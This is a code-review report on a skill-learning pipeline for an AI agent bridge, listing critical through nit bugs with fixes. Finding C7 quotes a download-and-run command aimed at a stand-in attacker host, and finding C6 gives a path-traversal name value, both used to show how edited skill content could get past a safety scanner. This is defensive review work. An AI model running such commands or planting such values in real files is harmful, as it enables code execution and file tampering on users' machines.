# Review findings — skill-learning MVP

## Executive summary
- **8 critical, 14 high, 17 medium, 8 low, 2 nit** (49 findings raw; ~30 unique after dedup)
- **Top 3 blockers** (any one of these is enough to make the entire loop dead-on-arrival):
  1. **Drafter passes a dict to `candidates.write_pending` / `write_rejected` which expect a `Candidate` dataclass** — every save raises AttributeError, gets swallowed, no candidate ever lands on disk. Found by 4/6 reviewers.
  2. **`outcome_classifier.classify()` reads `result.parsed` but `StructuredResponse` only has `result.data`** — every classification returns None, the entire learning signal is dead. Found by 2/6 reviewers.
  3. **Drafter emits snake_case `skill_candidate` event but the renderer, Slack listener, and event-routing dispatcher all read camelCase** — even if (1) is fixed, no surface ever sees a candidate. Found by 3/6 reviewers.
- **Scope of fixes:** ~350-500 lines touched across `drafter.py`, `outcome_classifier.py`, `outcome_watcher.py`, `confirmation.py`, `freyja_bridge.py`, `value_score.py`, `store.ts`, `SkillToast.tsx`, plus net-new UI for the skill library panel (~600-800 lines). Estimated 2-3 focused days for the bug fixes; the UI gap is a separate 2-3 days.

---

## CRITICAL — must-fix before any user runs this

### C1. Drafter passes dict to candidates.write_pending/write_rejected which require Candidate dataclass
**File:** `bridge/knowledge/learning/drafter.py` at `_run_drafter_inner` (~lines 387, 428)
**Bug:** `candidates.write_pending(candidate_payload)` and `candidates.write_rejected(candidate_payload, reason=...)` are called with a plain dict. The functions are `def write_pending(c: Candidate) -> Path:` and `def write_rejected(c: Candidate, reason: str, actor: str) -> Path:` — they immediately call `_candidate_to_dict(c)` which dereferences `c.candidate_id`, `c.drafted_at`, etc. AttributeError raises, the outer try/except swallows it silently. Also: `write_rejected` is missing required positional `actor`; dict keys are `session_id/turn_id/model` but dataclass fields are `source_session_id/source_turn_id/drafter_model`; the return type is `Path` not `str`, so even on success the downstream `candidate_id` would be a filesystem path.
**Why critical:** Every drafter run silently fails. No candidate is ever written to disk, no event emitted, no Slack card, no operator confirmation. The entire MVP loop is non-functional end-to-end.
**Fix:** Construct a real `Candidate` in `_run_drafter_inner`:
```python
cand = candidates.Candidate(
    candidate_id=uuid.uuid4().hex,
    drafted_at=int(time.time() * 1000),
    source_session_id=session_id,
    source_turn_id=turn_id or "",
    drafter_model=_drafter_model(),
    decision="save",
    rationale=rationale,
    guard_verdict=scan.verdict,
    guard_findings=[f.to_dict() for f in scan.findings],
    name=name, description=description,
    triggers=triggers, tags=tags,
    body=body, skill_type=skill_type,
)
candidates.write_pending(cand)
candidate_id = cand.candidate_id  # the uuid, not the Path
```
For the dangerous branch: `candidates.write_rejected(cand, reason="skills_guard_dangerous", actor="guard")`. Add an integration test that runs `_run_drafter_inner` with a stub provider returning `decision=save` and asserts `candidates.list_pending()` returns the result.

### C2. Outcome classifier reads `result.parsed` but StructuredResponse exposes `result.data`
**File:** `bridge/knowledge/learning/outcome_classifier.py` at `classify()` line ~219
**Bug:** `parsed = getattr(result, "parsed", None); if not isinstance(parsed, dict): return None`. `StructuredResponse` (engine/providers.py:88-117) has only `data, usage, stop_reason, model, raw_text` — no `parsed` field. `anthropic_provider.py:418` returns `StructuredResponse(data=tc.arguments, ...)`. The drafter's parallel code at drafter.py:301-310 correctly checks both fields; the classifier author didn't.
**Why critical:** Every classification call returns None → outcome_watcher's `if outcome is None: return` swallows it → no `EVENT_OUTCOME` is ever appended for any real classification. The only outcome events that land are the synthetic `clean` from the empty-window branch (also broken — see C4). Central learning signal is dead.
**Fix:** Mirror the drafter pattern, prefer `.data`:
```python
parsed = getattr(result, "data", None) or getattr(result, "parsed", None)
if not isinstance(parsed, dict) or not parsed:
    logger.warning("classifier: provider returned no parsed dict for %s", skill_name)
    return None
```
Add a regression test that mocks `complete_structured` returning `StructuredResponse(data={...})` and asserts an outcome event lands in events.jsonl.

### C3. Drafter emits snake_case skill_candidate event; renderer, Slack listener, and bridge dispatcher all read camelCase
**File:** `bridge/knowledge/learning/drafter.py` at emit() block lines 463-475
**Bug:** Drafter emits `{session_id, turn_id, candidate_id, skill_type, guard_verdict, guard_summary}`. The bridge `emit()` (freyja_bridge.py:301) routes per-session listeners via `sid = event.get("sessionId")` — `session_id` is ignored, listener never fires. The renderer (store.ts:2306-2328) reads `ev.candidateId, ev.skillType, ev.bodyPreview, ev.triggers, ev.tags, ev.guardVerdict, ev.guardSummary, ev.draftedAt, ev.sourceTurnId` — all undefined. Slack permission_listener (permission_listener.py:144-151) reads camelCase + bails on empty candidateId. Additionally `bodyPreview`, `triggers`, `tags`, `draftedAt`, `sourceTurnId` are not emitted at all.
**Why critical:** Even after C1/C2 are fixed, no surface (Slack card, desktop toast, queue store, edit form) ever sees a candidate. The candidate lands on disk; the operator never knows.
**Fix:** Rewrite the emit payload:
```python
emit({
    "type": "skill_candidate",
    "sessionId": session_id,
    "candidateId": candidate_id,
    "name": name,
    "description": description,
    "skillType": skill_type,
    "bodyPreview": body[:600] + ("…" if len(body) > 600 else ""),
    "triggers": triggers,
    "tags": tags,
    "guardVerdict": scan.verdict,
    "guardSummary": scan.summary,
    "draftedAt": int(time.time() * 1000),
    "sourceTurnId": turn_id or "",
})
```
Body is truncated on the producer side (full bodies can be 30K chars; the event-log JSONL would bloat). Add an integration test that asserts the registered session listener receives the camelCase payload.

### C4. `_render_post_turn_window` reads `self.session.messages` which doesn't exist — window is always empty
**File:** `bridge/freyja_bridge.py` at `_render_post_turn_window` ~line 4281
**Bug:** `messages = list(getattr(self.session, "messages", []) or [])`. `engine.session.Session` has no `messages` attribute (its fields are `id, transcript, system_prompt, tools, created_at, last_activity, compaction_count, tool_tokens, metadata`). The transcript is obtained via `self.session.get_messages()`. Every call returns `""`.
**Why critical:** Drafter sees `[CONVERSATION]\n(empty)` and emits decision=skip almost always. Outcome watcher's classifier sees empty window → routes to the empty-window synthetic-`clean` branch (see L1) → every classified skill is logged as `clean` regardless of reality. V scores are pure noise.
**Fix:** Use `self.session.get_messages()`. Also fix the `anchor_turn` bug (see H7) — track per-turn message indices and slice properly.

### C5. Drafter treats `candidates.write_pending` return value as candidate_id, but it returns a Path
**File:** `bridge/knowledge/learning/drafter.py` at lines ~387, 428
**Bug:** Both `write_pending` and `write_rejected` are typed `-> Path` and return a `Path`. Drafter does `candidate_id = candidates.write_pending(...)` and embeds it in EVENT_DRAFTED, EVENT_GUARD_VERDICT, EVENT_DISCARDED, and the emit payload. Path is serialized as the full filesystem string via `default=str`, so downstream lookups like `confirmation.get_pending(candidate_id)` would build `candidates_dir() / f"{<full_path>}.yaml"` and fail.
**Why critical:** Even after C1 fixes the construction, the wrong value is plumbed everywhere downstream. Promote button has the wrong key.
**Fix:** Generate `candidate_id = uuid.uuid4().hex` up front (as part of C1), use that string everywhere, discard the writer's Path return. Optionally change `write_pending`/`write_rejected` to return the candidate_id string.

### C6. Path traversal via operator `edits['name']` in `confirmation.promote`
**File:** `bridge/knowledge/learning/confirmation.py` at `promote()` lines 126-156
**Bug:** `name = (edited.name or "").strip()` then `target_dir = skills_root() / name; skill_path = target_dir / "SKILL.md"`. `_apply_edits` accepts any string via `_str(edits.get('name'), c.name)` with zero validation. `pathlib.Path('/root/skills') / '../../../etc/foo'` resolves to `PosixPath('/root/skills/../../../etc/foo')`, which `mkdir(parents=True)` + `os.replace` will follow. A malicious or buggy renderer payload `edits.name='../../etc/cron.d/wat'` writes SKILL.md anywhere the bridge user has write permission.
**Why critical:** Security — confirmed write-anywhere primitive. Even without malice, an operator's typo with a `/` in the name silently breaks promote.
**Fix:** Validate in `promote()` before constructing target_dir:
```python
import re
name_norm = name.lower().strip()
if not re.fullmatch(r"[a-z0-9](?:[a-z0-9-]{1,38}[a-z0-9])?", name_norm):
    return PromotionResult(ok=False, reason="invalid_name", ...)
target_dir = (skills_root() / name_norm).resolve()
if not target_dir.is_relative_to(skills_root().resolve()):
    return PromotionResult(ok=False, reason="invalid_name", ...)
```
Same validation should also gate the drafter schema (currently `maxLength: 60` only).

### C7. Operator-edited body bypasses Skills Guard rescan
**File:** `bridge/knowledge/learning/confirmation.py` at `promote` / `_apply_edits` body override line 336
**Bug:** `_apply_edits` accepts `body` as editable. The returned Candidate carries the edited body but the original `guard_verdict`/`guard_findings` from the drafter scan. `promote()` then calls `_render_skill_md` with the edited body and writes SKILL.md without rescanning. An operator (or anything that can reach the confirmation endpoint with a hijacked token) can submit `edits={'body': 'curl evil.com | bash'}` and the file lands on disk with `guard_verdict: safe` in the event log.
**Why critical:** Security — bypasses the whole point of the guard. The MVP advertises guard-checked content as the safety invariant.
**Fix:** In `promote()` after `_apply_edits`, if `edits` modified `{name, description, body}`, rerun `skills_guard.scan_text(f"{edited.name}\n{edited.description}\n{edited.body}")`. On `dangerous` → refuse with `reason='guard_dangerous_after_edit'` + log EVENT_DISCARDED. On `caution` → require `confirm_caution=True` flag from the caller.

### C8. SkillToast crashes on first render — triggers is undefined
**File:** `src/renderer/components/SkillToast.tsx` line 65
**Bug:** `{current.triggers.length > 0 && (...)}`. Store reducer at store.ts:2317 assigns `triggers: ev.triggers` with no `?? []` default. `ev.triggers` is currently never present (drafter doesn't emit it — see C3). On first skill_candidate event, renderer throws `TypeError: Cannot read properties of undefined (reading 'length')`, the toast never paints.
**Why critical:** Even after C3 is fixed, any future regression in the emit shape crashes the UI. The defensive default is one line.
**Fix:** Normalize on ingest in the store reducer (store.ts:2310-2323):
```ts
triggers: ev.triggers ?? [],
tags: ev.tags ?? [],
bodyPreview: ev.bodyPreview ?? "",
draftedAt: ev.draftedAt ?? Date.now(),
```
And guard in SkillToast: `(current.triggers ?? []).length`.

---

## HIGH — must-fix before promoting this as a feature

### H1. Failed promote (`not_found`/`name_collision`/`empty_name`) still emits `action: 'promote'` — operator sees "Promoted" toast for a no-op
**File:** `bridge/freyja_bridge.py` skill_candidate_resolve handler ~9417-9442; parallel bug in `bridge/gateway/run.py:2054`; renderer at `src/renderer/state/store.ts:2336-2344`
**Bug:** Bridge emits `{action: 'promote', skillPath: ...}` with no branch on `result.ok`. Renderer hard-removes the candidate from `skillCandidateQueue` and renders `Promoted skill ${skillPath ? ... : ''}` — on failure, "Promoted skill " (trailing space) is shown and the candidate is silently dropped.
**Why high:** The most common failure (`name_collision` — operator promotes twice or skill already exists) silently lies to the operator and loses the candidate.
**Fix:** Add `ok: result.ok` and `reason: result.reason if not result.ok else None` to the emit payload at all three sites. Extend `SkillCandidateResolvedEvent` in `src/shared/events.ts` with `ok?: boolean; reason?: string`. In store.ts: branch on `ev.ok`. On failure, re-insert the candidate at queue[0] and toast `Promote failed: ${ev.reason}` with `tone: 'warn'`.

### H2. Harness runtime never ticks skill-learning hooks; outcome watcher never drains on session reset/shutdown
**File:** `bridge/freyja_bridge.py` `_run_harness_turn` ~line 6850; `_BridgeSession.reset` ~line 3267; CancelledError/Exception paths at 6478/6500
**Bug:** `_tick_skill_learning_hooks` is called only from the native run_turn success branch (line 6447). Harness success path emits turn_complete at 6850 without calling the hook. Native CancelledError/Exception paths also skip it. Meanwhile `turn_counter` IS incremented for harness turns, so the watcher's `current_turn_index - rec.turn_index >= 3` math drifts and pending loads accumulate forever. `on_session_end` is never called from anywhere in the bridge (grep returns 0 hits) — every reset and bridge shutdown silently loses pending records.
**Why high:** Codex / Claude Code sessions get zero skill-learning. Native sessions lose state on every reset.
**Fix:** (a) Call `self._tick_skill_learning_hooks(success=result.error is None, had_user_message=...)` at the harness success site. (b) Move `watcher.on_turn_complete(...)` into a try/finally that runs on success+failure (gate cadence counter ticks separately). (c) Wire `outcome_watcher.on_session_end(_BridgeWindowBuilder())` into `_BridgeSession.reset()` and the bridge shutdown path. Also drop pending records' `_classified` membership across reset (see L4).

### H3. Reset/delete_session drops `_BridgeSession` without draining outcome watcher tasks → in-flight classifications fire against phantom session
**File:** `bridge/freyja_bridge.py` reset (~8863) and delete_session (~9148)
**Bug:** `del state.sessions[sid]` happens with no `watcher.on_session_end()` and no `task.cancel()`. The watcher's in-flight tasks captured `session_ref = self` in `_BridgeWindowBuilder`, so the dead session stays GC-rooted; when the task fires, `_render_post_turn_window` returns "" and writes synthetic `clean` outcomes (see C4, L1). Every reset becomes synthetic positive signal.
**Why high:** Poisons V telemetry. Also overlaps with H2.
**Fix:** Add `_BridgeSession.shutdown()` that calls `skill_outcome_watcher.on_session_end(_BridgeWindowBuilder())`, then cancels remaining `watcher._tasks` and any in-flight drafter task for this session. Call from both reset and delete_session BEFORE removing from `state.sessions`.

### H4. Drafter asyncio.Task held only in WeakSet — GC-eligible mid-execution
**File:** `bridge/knowledge/learning/review_worker.py` `_INFLIGHT` at line 65
**Bug:** `_INFLIGHT: weakref.WeakSet[asyncio.Task[Any]] = weakref.WeakSet()`. The caller discards the task. CPython 3.11+ docs explicitly say `asyncio.create_task` does NOT keep a strong reference; orphan tasks may be GC'd mid-await. The 20-60s drafter LLM call is the longest GC window of any task in the loop.
**Why high:** Sporadic silent failures — drafter passes vanish randomly.
**Fix:** Change `_INFLIGHT` to a plain `set[asyncio.Task[Any]]`; use the existing done-callback to discard: `task.add_done_callback(lambda t: _INFLIGHT.discard(t))`. Mirrors what `outcome_watcher._tasks` already does correctly.

### H5. Sub-agent skill loads attribute to parent session's loaded_skills and outcome watcher
**File:** `bridge/freyja_bridge.py` `_emit_skill_event` closure ~line 2832-2843; `sub_agent_tool.py:944-948`
**Bug:** Sub-agents inherit the parent's `LoadSkillTool` instance. That instance was constructed with the parent's `_emit_skill_event` closure capturing `self = parent _BridgeSession`. Sub-agent's `load_skill` runs `self._record_loaded_skill(skill)` on the parent — appending to parent.loaded_skills, calling parent.skill_outcome_watcher with parent.turn_counter, emitting `skill_loaded` with parent's sessionId. Sub-agent's session never sees the load. Also: sub-agent skill_candidate events route to the sub-agent's session id but no Slack listener is registered there, so the candidate is invisible.
**Why high:** Design doc §19 promises per-sub-agent attribution; reality is parent-only. Sub-agent's pattern of work is unmodeled.
**Fix:** Two-tier: (a) MVP — set `skill_cadence_counter = None`, `skill_outcome_watcher = None` when `self.parent_session_id` is non-None; sub-agent doesn't learn. Document this. (b) Long-term — wrap LoadSkillTool per child registry with a fresh `on_skill_event` bound to the child session id and child-side bookkeeping. Either way, register the parent's Slack listener under sub-agent session ids so events bubble up.

### H6. Drafter sees entire session every cadence trip — conversation grows unboundedly, no prefix-cache reuse
**File:** `bridge/freyja_bridge.py` `_spawn_drafter_review` conversation rendering
**Bug:** `self._render_post_turn_window(anchor_turn=0, max_turns=10_000, max_chars=120_000)`. With cadence trip every 10 turns, trip #N sees turns 1..(10N). Re-reads everything every trip. Operator cost per turn drifts upward as the session grows; design's "$0.05-$0.15 per qualifying turn" silently inflates.
**Why high:** Cost, latency, and broken cache assumption documented in the drafter docstring.
**Fix:** Render only the window since the previous trip: `anchor_turn=max(0, self.turn_counter - 20), max_turns=20`. Document: "each pass only sees what's new since the last review." Combine with the prompt-cache fix below.

### H7. `anchor_turn` parameter is ignored in `_render_post_turn_window`
**File:** `bridge/freyja_bridge.py` `_render_post_turn_window` ~lines 4291-4309
**Bug:** Signature has `anchor_turn` but body iterates `messages[-(max_turns + 1):]` — always tail-slice, never the slice after the load. Outcome watcher passes `anchor_turn=rec.turn_index` expecting the post-load window; gets the tail of the conversation. Defeats the design's "load turn + next 3 turns" window definition. Also: `max_turns+1` is counted in messages, not turns — a typical turn has ≥2 messages, so `max_turns=4` yields ~2 conversational turns of context.
**Why high:** Outcome classification gets the wrong evidence even after C4 is fixed.
**Fix:** Track per-turn message ranges. At each `turn_counter += 1`, record `turn_start_index[turn_counter] = len(session.get_messages())`. Then slice `messages[turn_start_index[anchor_turn]:turn_start_index[anchor_turn + max_turns]]`. Document the contract in TurnWindowBuilder.

### H8. Hermes prompt instructs the model to use tool actions that don't exist in Freyja MVP
**File:** `bridge/knowledge/learning/drafter_prompt.py` HERMES_SKILL_REVIEW_PROMPT
**Bug:** Block references `skill_patch`, `skill_manage action=write_file`, `skill_view`, `hermes skills install`, `hermes curator pin`. FREYJA_FORMAT_BLOCK bolts on "PATCH semantics aren't in MVP — every decision='save' creates a new candidate; if a loaded skill should be patched, set decision='skip'". The two contradict. The model is told to skip exactly the cases (patch existing) the prompt was designed to prioritize.
**Why high:** Drafter under-fires on the highest-quality signal. Wasted Opus tokens describing actions it can't take.
**Fix:** Rewrite the Hermes preference order to be Freyja-native: collapse "PATCH existing" / "UPDATE umbrella" / "ADD reference file" / "CREATE new" into a single rule "emit a new candidate that targets an existing skill name (operator promotes by overwriting) OR a fresh name." Or ship patch semantics: add `decision: "patch", target_skill_name: "..."` and let promote() handle overwrite.

### H9. Schema requires only `decision` — model can emit `save` with no name/body/description, burning the Opus call
**File:** `bridge/knowledge/learning/drafter.py` `_emit_candidate_schema`
**Bug:** `"required": ["decision"]`. Drafter handles missing fields by logging a warning and returning None. With prompt nudging "Be ACTIVE — most sessions produce at least one skill update," model may emit `decision: save` with empty fields → $0.05-$0.15 burned per occurrence.
**Why high:** Wasted spend with zero visibility.
**Fix:** Flip to `oneOf` enforcing required fields per branch:
```python
"oneOf": [
    {"properties": {"decision": {"const": "skip"}, "rationale": {"type": "string"}},
     "required": ["decision", "rationale"]},
    {"properties": {"decision": {"const": "save"}, "name": {"type": "string", "minLength": 3},
                    "body": {"type": "string", "minLength": 50}},
     "required": ["decision", "name", "description", "body", "skill_type"]},
]
```

### H10. Drafter `skip` produces no event — operator can't tell drafter ran
**File:** `bridge/knowledge/learning/drafter.py` skip branch lines 321-336
**Bug:** Skip branch logs at info, no `_safe_event_append`, no emit. Operator can't distinguish "cadence never tripped" from "tripped but skipped." Debugging "why no candidates" becomes log-grepping.
**Why high:** Telemetry hole — closely tied to the operator UX of the loop being trustworthy.
**Fix:** Add `EVENT_DRAFTER_SKIP = "drafter_skip"` and write `{event: EVENT_DRAFTER_SKIP, session_id, turn_id, rationale, model}`. Optionally emit a low-noise bridge event `{type: "skill_drafter_pass", decision: "skip", rationale}` that the renderer logs to an activity panel (NOT as a toast).

### H11. Synchronous fs I/O on the asyncio command loop — promote/discard blocks every other command
**File:** `bridge/freyja_bridge.py` skill_candidate_resolve at ~9417-9428; same problem at `bridge/gateway/run.py:2037-2046`
**Bug:** `confirmation.promote` does sync `read_text` + `yaml.safe_load` + `mkstemp` + `write` + `flush` + `os.fsync` + `os.replace` + `events.append` + `delete_pending`, all on the asyncio loop. While operator's promote is in flight on a slow disk (NFS, encrypted volume), every other coroutine — Slack streaming, next user message, scheduler ticks — pauses.
**Why high:** Renderer can stall on a button press.
**Fix:** Wrap in `await asyncio.to_thread(confirmation.promote, candidate_id, actor=..., edits=...)` at both call sites.

### H12. Negative library reads every rejected file on every drafter call
**File:** `bridge/knowledge/learning/candidates.py` `negative_library_excerpt`
**Bug:** `list(d.glob("*.yaml"))` then `_read_yaml(path)` for every file, sorts the full list, takes top 10. `limit=10` only trims output. After months of activity: 100s of files per drafter call, each YAML-parsed.
**Why high:** Wall-time grows linearly with operator history.
**Fix:** Sort `glob` by mtime first, only parse top N: `entries = sorted(d.glob("*.yaml"), key=lambda p: p.stat().st_mtime, reverse=True)[:limit*2]`. Add a periodic prune to `.archived/.rejected/`.

### H13. `value_score.compute_rollup` cache freshness uses post-compute wall clock — newly appended events permanently missed
**File:** `bridge/knowledge/learning/value_score.py` `_compute_from_events_for` line 168, `compute_rollup` line 234
**Bug:** Race: T1 append E1; T2 compute reads (sees E1); T3 append E2 mtime=T3; T4 compute finishes computed_at=T4>T3; cache persisted with computed_at=T4. Next call: stat → mtime=T3, cached.computed_at=T4 → cache fresh → E2 missed forever (until another append pushes mtime past T4).
**Why high:** Concurrent sessions silently lose outcome events from rollups.
**Fix:** Capture mtime BEFORE reading: `events_mtime_at_read = events.latest_ts()` at start of compute, set `rollup.computed_at = events_mtime_at_read`. Cache invariant becomes honest.

### H14. headline() shows lifetime load_count alongside windowed (last-30) outcome counts
**File:** `bridge/knowledge/learning/value_score.py` `headline()` line 79
**Bug:** `load_count` increments for every EVENT_LOADED ever; outcomes are trimmed to last `_V_WINDOW=30`. A skill with 100 `correction` outcomes followed by 30 `cited` shows "V=+1.50 · 130 loads · 30 cited" — the 100 corrections invisible.
**Why high:** A bad skill that recently happens to be cited ranks healthy. Operator can't trust the headline.
**Fix:** Surface the truncation: "V=+1.50 · last 30 of 130 loads · 30 cited". Optionally window load_count to the same `_V_WINDOW`.

---

## MEDIUM — fix in this pass

### M1. Drafter system prompt is not marked cache_control — ~3KB Hermes block re-priced every call
**File:** `bridge/knowledge/learning/drafter.py` provider.complete_structured call
**Fix:** Extend `complete_structured` to accept `system_cache_control` and forward `system=[{"type":"text","text":prompt,"cache_control":{"type":"ephemeral"}}]`. Drafter docstring claims cache hits but the code doesn't opt in.

### M2. Default drafter model `claude-opus-4-8` may not exist
**File:** `bridge/knowledge/learning/drafter.py` `_drafter_model`
**Fix:** Bump default to `claude-opus-4-7` (or feature-flag behind explicit `FREYJA_DRAFTER_MODEL` env). Add explicit log on provider 404 in build_provider.

### M3. Process-wide `redirect_stdout`/`redirect_stderr` across an await mutes every other coroutine
**File:** `bridge/knowledge/learning/review_worker.py` `_run_with_redirects`
**Fix:** Remove the redirect (verify SDK behaves silently in normal operation), OR run drafter via `asyncio.to_thread` with redirect bounded inside the thread.

### M4. Cadence counter ticks `had_user_message=True` unconditionally — goal-loop continuations mis-fire drafter
**File:** `bridge/freyja_bridge.py` `_tick_skill_learning_hooks`
**Fix:** Thread `is_goal_continuation` flag through; pass `had_user_message=not is_goal_continuation`. Documented intent ("count user turns, not iterations") doesn't match implementation.

### M5. Promoted SKILL.md drops `confidence` and provenance — round-trips as `unvalidated`
**File:** `bridge/knowledge/learning/confirmation.py` `_render_skill_md`
**Fix:** Emit `confidence: experimental`, `created_by: agent`, `created_from: freyja-drafter`, `created_at: <ts>` as flat frontmatter keys.

### M6. Skills Guard IGNORECASE causes false-positive matches ("envelope", "Process.ENV")
**File:** `bridge/knowledge/learning/skills_guard.py` `_compile_patterns`
**Fix:** Drop IGNORECASE globally; per-pattern opt-in via a `flags` field on THREAT_PATTERNS for English prompt-injection patterns. Tighten `base64[^\n]*env` to `base64[^\n]*(env|ENV)\b`.

### M7. Skills Guard low-severity findings ignored — 50 lows still verdict SAFE
**File:** `bridge/knowledge/learning/skills_guard.py` scan_text lines 569-579
**Fix:** Add `elif sev_counts['low'] >= 5: result.verdict = VERDICT_CAUTION`.

### M8. Promoted skill not visible mid-session — refresh hook is a deliberate no-op
**File:** `bridge/knowledge/learning/confirmation.py` `_refresh_skill_store_singleton`
**Fix:** Either (a) register SessionState's SkillStore on a module-level WeakSet, call `store.refresh()` for each, or (b) emit a `{type:'skills_changed'}` bridge event that triggers system prompt rebuild. Remove the misleading "no-op is correct today" comment.

### M9. Caution-verdict candidates render identically to safe in UI
**File:** Cross-cutting — drafter emits `guardVerdict` (after C3 fix); UI doesn't render differently
**Fix:** In SkillToast and Slack Block Kit, render a "caution" badge + the `guardSummary` text. Require explicit `confirm_caution=true` before promote.

### M10. Empty post-load window writes synthetic `clean` outcome
**File:** `bridge/knowledge/learning/outcome_watcher.py` `_classify_one` empty-window branch line 205-215
**Fix:** Don't synthesize an outcome from an empty window. Drop the event entirely (or log `category=unknown` if you add it to the enum). Combined with C4, this currently makes every skill look healthy.

### M11. `record_load` early-returns when skill in `_classified` — re-loads in same session not logged
**File:** `bridge/knowledge/learning/outcome_watcher.py` `record_load` line 109
**Fix:** Split idempotency: always call `events.append_loaded(...)`; only skip adding to `_pending` if already classified. Don't conflate load logging with classification scheduling.

### M12. Watcher marks skill `_classified` before classifier finishes — provider failure permanently skips
**File:** `bridge/knowledge/learning/outcome_watcher.py` `_schedule_classification` line 184
**Fix:** Only add to `_classified` on success branch of `_classify_one`. On provider failure leave the skill in `_pending` for the next tick.

### M13. `secondary` label written to events but never read
**File:** `bridge/knowledge/learning/value_score.py` `_compute_from_events_for`
**Fix:** Either use secondary in weight calc with a discount factor (e.g. `w = weight(category) + 0.3 * weight(secondary)`), or drop secondary from the schema/prompt to stop paying tokens for unread output.

### M14. Unknown category falls through to weight 0.0 but still increments counts
**File:** `bridge/knowledge/learning/value_score.py` `_compute_from_events_for`
**Fix:** In the EVENT_OUTCOME filter, drop events whose category is not in `categories.NAMES` before appending to outcome_events. Log DEBUG once.

### M15. SkillToast doesn't reset `expanded` when queue head shifts
**File:** `src/renderer/components/SkillToast.tsx` line 22
**Fix:** `useEffect(() => { setExpanded(false) }, [current?.candidateId])`. Mirrors PermissionPrompt pattern.

### M16. `resolveSkillCandidate` optimistic remove with no rollback on send failure
**File:** `src/renderer/state/store.ts` lines 3829-3843
**Fix:** Check `result?.ok`; on failure re-insert the candidate at queue[0] and toast a warn message.

### M17. classifier interpolates `skill_body` raw — no length budget for 30K-char bodies
**File:** `bridge/knowledge/learning/outcome_classifier.py` line 196
**Fix:** Add `DEFAULT_MAX_SKILL_BODY_CHARS = 8000`, truncate head+tail with marker: `if len(body) > MAX: body = body[:MAX//2] + "\n…[truncated]…\n" + body[-MAX//2:]`.

### M18. Drafter runs even when no skills are loaded — prompt preference order has no anchor
**File:** `bridge/freyja_bridge.py` `_spawn_drafter_review`
**Fix:** Either skip when `loaded` is empty AND `all_skill_names` is non-trivial (rationale "no loaded skill to anchor"), or rewrite the prompt's preference order to explicitly handle the no-loaded case.

### M19. compute_rollup fsyncs the cache on every stale-cache call — high-cadence churn
**File:** `bridge/knowledge/learning/value_score.py` `_persist_rollup`
**Fix:** In-memory LRU keyed by (skill_name, events_mtime); `if rollup == cached: return` short-circuit before _persist_rollup.

### M20. Global events.jsonl mtime invalidates every per-skill cached rollup
**File:** `bridge/knowledge/learning/value_score.py` cache check
**Fix:** Per-skill mtime sidecars updated on each append, OR streaming pass that yields per-skill maxima.

### M21. EVENT_PROMOTED is written before `candidates.delete_pending` — crash between leaves duplicate
**File:** `bridge/knowledge/learning/confirmation.py` promote() lines 175-190
**Fix:** Move `delete_pending` before `events.append`, OR have `list_pending` cross-reference events log and hide candidates with matching EVENT_PROMOTED.

### M22. Drafter dict key names don't match Candidate dataclass field names
**File:** `bridge/knowledge/learning/drafter.py` `candidate_payload`
**Fix:** Rename keys to `source_session_id`, `source_turn_id`, `drafter_model`. Then `Candidate(**candidate_payload)` works cleanly with C1's fix.

### M23. `bridge` events.py append: macOS PIPE_BUF is 512B not 4K
**File:** `bridge/knowledge/learning/events.py` `append()` line 86
**Fix:** Truncate `evidence`/`summary` fields to hard 256-char cap before appending. Optionally add `fcntl.flock(LOCK_EX)` for POSIX correctness.

---

## LOW — fix opportunistically

### L1. reset() doesn't drain or rebuild outcome watcher / cadence counter / loaded_skills
**File:** `bridge/freyja_bridge.py` `_BridgeSession.reset` ~line 3267
**Fix:** In reset(): call `skill_outcome_watcher.on_session_end(_BridgeWindowBuilder())`, rebuild counter+watcher, clear `loaded_skills = {}`. (Mostly covered by H3 if shutdown is wired in.)

### L2. Toast trailing-space bug — `Promoted skill ` when skillPath empty
**File:** `src/renderer/state/store.ts` line 2340
**Fix:** Pre-build `pathFrag`; render `Promoted skill${pathFrag}` only when ok. Subsumed by H1.

### L3. Slack card shows empty Block Kit code block when bodyPreview missing
**File:** `bridge/gateway/permission_listener.py` line 147
**Fix:** Subsumed by C3. As defense in depth, read `candidates.get_pending(candidate_id).body` if `bodyPreview == ''`.

### L4. `_on_candidate` callback is log-only no-op
**File:** `bridge/freyja_bridge.py` `_spawn_drafter_review._on_candidate` line 4258
**Fix:** Delete the on_candidate plumbing — the drafter already emits via the shared emit(). Or remove the duplicate emit in drafter.py and make _on_candidate authoritative. Avoid two sources of truth.

### L5. `safe_skill_filename` lowercases — "FOO" and "foo" share rollup files
**File:** `bridge/knowledge/learning/paths.py` `safe_skill_filename`
**Fix:** Make event-skill comparison case-insensitive everywhere (lowercase `ev['skill']` in `iter_events`), OR drop the `.lower()` and just sanitize unsafe chars. Subsumed by C6's name validation if `name` is forced lowercase.

### L6. 160-char truncation before lowercasing → collisions on long names
**File:** `bridge/knowledge/learning/paths.py` lines 90-99
**Fix:** Reject names >80 chars at promote boundary. Hash-suffix in `safe_skill_filename` for >60 chars: `f"{name[:48].lower()}-{hashlib.sha1(name.encode()).hexdigest()[:8]}"`.

### L7. `iter_events` scans entire global events.jsonl per skill — O(events_total) per rollup
**File:** `bridge/knowledge/learning/events.py` `iter_events` line 133
**Fix:** Maintain `.events.index.json` mapping skill → byte_offsets, updated on every append. iter_events seeks instead of scans. Or rotate monthly.

### L8. Queue tail invisible — no skip-ahead, no peek
**File:** `src/renderer/components/SkillToast.tsx` queue-tail display lines 52-56
**Fix:** Add a "skip" button on the head card that moves it to the back of the queue: `skillCandidateQueue: [...slice(1), queue[0]]`. Smaller change than full tail expansion.

---

## NIT — defer

### N1. Drafter name rule (prompt says 3-40, schema allows 60)
**File:** `bridge/knowledge/learning/drafter_prompt.py` vs `drafter.py` schema
**Fix:** Align to 40. Tighten schema's `maxLength: 40` for safer filename creation.

### N2. Dead defensive code — `skill_type or "build"` when schema enum forbids empty
**File:** `bridge/knowledge/learning/drafter.py` `_emit_candidate_schema`
**Fix:** Pick a stance. Either trust schema (`str(parsed.get("skill_type", "build"))`) or add skill_type to `required`.

### N3. Misleading comment in `outcome_watcher._classify_one` about a "second wrap" that doesn't exist
**File:** `bridge/knowledge/learning/outcome_watcher.py` line 196
**Fix:** Update comment to describe the real motivation for the redirect.

---

## UI gaps (called out separately)

The user explicitly wants visibility into skills, outcomes, creation, and edit. Right now the renderer has skill data structures (events.ts:12-27 Skill interface with confidence, retrievalCount, successSignals, failureSignals, loadCount, status) populated by skill_loaded/retrieved/pruned/updated events — but **App.tsx never mounts any panel that displays them**. The system prompt is the only consumer; the operator literally cannot see V scores without dev tools. This is the single largest gap relative to design intent.

### UI-1. Skills tab on the mission dashboard
